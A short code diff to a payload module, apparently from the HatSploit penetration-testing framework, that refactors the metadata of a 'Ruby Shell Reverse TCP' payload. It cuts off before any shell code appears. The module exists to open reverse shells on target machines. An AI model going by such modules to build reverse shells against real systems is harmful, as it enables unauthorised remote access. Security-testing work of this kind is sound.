@@ -10,7 +10,7 @@ class HatSploitPayload(Payload):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "Ruby Shell Reverse TCP",
             'Payload': "unix/generic/ruby_reverse_tcp",
             'Authors': [
@@ -21,7 +21,7 @@ class HatSploitPayload(Payload):
             'Platform': "unix",
             'Rank': "high",
             'Type': "reverse_tcp",
-        }
+        })
 
     def run(self):
         payload = (
